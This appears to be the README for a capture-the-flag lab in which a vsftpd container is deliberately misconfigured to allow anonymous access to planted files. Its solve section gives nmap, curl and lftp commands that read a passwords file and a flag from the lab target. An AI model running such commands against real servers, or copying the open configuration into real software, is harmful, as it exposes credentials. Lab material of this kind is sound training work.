# Exercise: Anonymous FTP Exposure (v2)

A misconfigured `vsftpd` permitting anonymous read access to a directory of sensitive files.
The v2 port of the v1 `ftp_anon` image, rebuilt on `ubuntu:22.04` so it's multi-arch
(native on Apple Silicon, no emulation).

## Files
- `images/ftp/Dockerfile` — vsftpd on ubuntu:22.04, loot baked into `/srv/ftp`.
- `images/ftp/vsftpd.conf` — anonymous read-only config.
- `images/ftp/entrypoint.sh` — injects `pasv_address` = pod IP so passive mode works in-pod.
- `loot/` — planted files: `README.txt`, `pub/notice.txt`, `secrets/passwords.txt`,
  `secrets/flag.txt` (`FLAG{anonymous_ftp_exposed}`).
- `manifest.yaml`, `meta.yaml`.

## Solve (from the Kali shell, target `ftp-anon`)
```bash
nmap -p21 -sV ftp-anon
# anonymous login, no password
curl ftp://ftp-anon/                       # list root
curl ftp://ftp-anon/secrets/flag.txt       # capture the flag
lftp -e 'set ftp:passive-mode on; ls secrets; cat secrets/passwords.txt; bye' \
     -u anonymous, ftp-anon
```

## Notes
- Passive FTP in Kubernetes requires the server to advertise a client-reachable address;
  `entrypoint.sh` sets `pasv_address` to the pod IP, reachable from Kali in the same
  namespace (allowed by the tenant egress policy).
